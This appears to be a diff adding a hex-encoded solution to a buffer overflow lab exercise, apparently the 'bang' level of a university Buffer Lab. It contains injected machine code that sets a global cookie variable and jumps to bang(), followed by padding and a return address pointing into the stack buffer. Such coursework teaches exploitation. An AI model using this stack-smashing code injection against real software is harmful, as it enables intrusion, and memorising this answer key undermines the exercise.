@@ -1,0 +1,9 @@
+/* assign cookie to global_value */
+c7 05 18 c2 04 08 ab 74 87 4d   /* movl $0x4d8774ab, 0x0804c218 */
+68 05 8d 04 08                  /* push $0x08048d05 ; addr of bang() */
+c3                              /* ret */
+/* Padding required: 28 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+/* head addr of buf */
+18 32 68 55
